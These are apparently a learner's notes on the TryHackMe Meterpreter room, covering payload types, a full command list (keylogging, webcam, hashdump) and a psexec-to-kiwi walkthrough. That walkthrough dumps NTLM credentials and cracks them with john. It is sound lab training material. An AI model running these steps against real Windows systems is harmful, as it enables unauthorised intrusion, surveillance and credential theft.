# Room
https://tryhackme.com/room/meterpreter

# Task 1 - Intro
* meterpreter is a metasploit payload that will run on the target system and act as an agent
* meterpreter runs in memory on the target but is not installed
* meterpreter avoids IPS and IDS by using TLS encrypted communication
* basic meterpreter commands
    * getpid - returns the meterpreter process id
    * ps - returns a list of running processes on the target

# Task 2 - meterpreter flavors
* meterpreter can either be a single or staged payload
* staged payloads are sent in two steps
    * stager
    * stages
* list meterpreter payloads in msfvenom
    * msfvenom --list payloads | grep meterpreter
* meterpreter payload type depends on
    * target OS
    * software libraries/components available on target OS
    * network connection types

# Task 3 - meterpreter commands
* once in a meterpreter shell  you can type help to list out the help screen
* useful meterpreter commands
    * core
        * background
        * exit
        * guid
        * help
        * info
        * irb
        * load
        * migrate
        * run
        * sessions
    * file system
        * cd
        * ls
        * pwd
        * edit
        * cat
        * rm
        * search
        * upload
        * download
    * networking
        * arp
        * ifconfig
        * netstat
        * portfwd
        * route
    * system
        * clearev
        * execute
        * getpid
        * getuid
        * kill
        * pkill
        * ps
        * reboot
        * shell
        * shutdown
        * sysinfo
    * other
        * idletime
        * keyscan_dump
        * keyscan_start
        * keyscan_stop
        * screenshare
        * screenshot
        * record_mic
        * webcam_chat
        * webcam_list
        * webcam_stream
        * getsystem
        * hashdump

# Task 4 - post exploitation with meterpreter
* useful post exploitation commands
    * getuid
    * ps
    * migrate
    * keyscan_start
    * keyscan_stop
    * keyscan_dump
    * hashdump
    * search
    * shell
    * getsystem
    * load

# Task 5 - post exploitation challenge
* load msfconsole and use the psexec module, initail creds are given to get in the box
    * msfconsole
    * use exploit/windows/smb/psexec
    * set rhosts [target_ip]
    * set smbuser [user]
    * set smbpass [password]
    * run
    * sysinfo
* once a meterpreter session has been established, background it and enumerate SMB
    * background
    * search smb
    * use 1
    * set session 1
    * run
* after you have grabbed the shares you'll have to migrate out of your powershell.exe process to another one, i chose svchost.exe
    * sessions -i 1
    * ps (make note of an svchost pid)
    * migrate [svchost pid]
    * getuid (verify nt authority\system)
* now that you are in a better process space you can load kiwi to grab the ntlm hashes
    * load kiwi
    * creds_all
* from here i took the ntlm hash for the target user and went to talk to john
    * john --format=NT -w=/usr/share/wordlists/rockyou.txt j.txt
* lastly was finding files, dropping to a shell and using dir was good enough
    * shell
    * cd \
    * dir something.txt /s /a